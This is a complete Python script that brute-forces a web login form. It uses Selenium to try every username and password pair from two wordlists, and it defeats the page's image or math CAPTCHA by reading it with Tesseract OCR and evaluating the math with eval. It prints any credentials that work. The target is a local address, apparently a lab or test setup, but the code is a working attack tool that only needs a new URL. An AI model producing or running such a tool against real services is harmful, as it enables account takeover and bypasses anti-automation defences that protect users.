import time
from PIL import Image
import pytesseract
from selenium import webdriver
from selenium.webdriver.common.by import By
import cv2

pytesseract.pytesseract.tesseract_cmd = r"C:\Program Files\Tesseract-OCR\tesseract.exe"

def preprocess_image(image_path):
    import cv2
    img = cv2.imread(image_path)
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    _, thresh = cv2.threshold(gray, 150, 255, cv2.THRESH_BINARY_INV)
    processed_path = "processed.png"
    cv2.imwrite(processed_path, thresh)
    return processed_path

import re

def solve_captcha_with_tesseract(image_path):
    processed = preprocess_image(image_path)
    image = Image.open(processed)

    # Use Tesseract to get raw text
    raw_text = pytesseract.image_to_string(image, config='--psm 8').strip()
    print(f"[BOT OCR Raw] {raw_text}")

    # Try to extract and evaluate math expressions like "5 + 3" or "8-2"
    match = re.search(r'(\d+)\s*([\+\-\*\/])\s*(\d+)', raw_text)
    if match:
        a, op, b = match.groups()
        try:
            result = str(eval(f"{a}{op}{b}"))
            print(f"[BOT] Math CAPTCHA Detected: {a} {op} {b} = {result}")
            return result
        except Exception as e:
            print(f"[ERROR] Math eval failed: {e}")

    # Fallback to cleaned alphanumeric text for regular CAPTCHAs
    cleaned = ''.join(c for c in raw_text if c.isalnum()).upper()
    print(f"[BOT] Text CAPTCHA Detected: {cleaned}")
    return cleaned


with open("usernames.txt") as f:
    usernames = [line.strip() for line in f]

with open("passwords.txt") as f:
    passwords = [line.strip() for line in f]

driver = webdriver.Chrome()
driver.get("http://127.0.0.1:5000/")
time.sleep(2)

success = False

for username in usernames:
    for password in passwords:
        driver.get("http://127.0.0.1:5000/")
        time.sleep(1)

        captcha_img = driver.find_element(By.TAG_NAME, "img")
        captcha_img.screenshot("captcha.png")

        captcha_text = solve_captcha_with_tesseract("captcha.png")

        driver.find_element(By.NAME, "username").send_keys(username)
        driver.find_element(By.NAME, "password").send_keys(password)
        driver.find_element(By.NAME, "captcha").send_keys(captcha_text)
        driver.find_element(By.TAG_NAME, "button").click()

        time.sleep(2)
        if "✅ Logged in" in driver.page_source:
            print(f"✅ SUCCESS: {username}:{password}")
            success = True
            break
        else:
            print(f"❌ Failed: {username}:{password}")

    if success:
        break

driver.quit()
